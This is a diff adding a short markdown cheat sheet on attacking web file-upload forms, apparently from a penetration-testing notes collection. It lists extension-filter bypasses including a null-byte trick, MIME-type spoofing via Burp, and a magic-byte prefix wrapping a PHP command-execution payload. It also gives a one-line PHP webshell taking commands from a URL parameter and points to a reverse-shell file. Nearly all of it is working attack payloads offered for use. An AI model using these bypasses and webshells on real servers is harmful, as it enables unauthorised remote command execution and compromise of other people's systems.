@@ -1,0 +1,32 @@
+# File Upload
+
+## Extension Bypass
+
+Servers often block `.php` but accept alternate extensions that the runtime still executes: try variations until one passes the filter.
+
+```
+shell.php → shell.php5, shell.phtml, shell.pHp, shell.php.jpg
+shell.jpg.php
+shell.php%00.jpg
+```
+
+## MIME Type Bypass
+
+Change Content-Type to `image/jpeg` in Burp: many validators check only the header, not the actual file content.
+
+## Magic Bytes Bypass
+
+Prepend a valid image magic byte sequence before the PHP payload to fool file-type validators that read the first few bytes.
+
+```
+GIF89a; <?php system($_GET['cmd']); ?>
+```
+
+## Webshells
+
+Upload a webshell to get command execution: use the minimal version for stealth, or a full reverse shell when you need an interactive session.
+
+```php
+<?php system($_GET['cmd']); ?>
+# Full shell: /usr/share/webshells/php/php-reverse-shell.php
+```
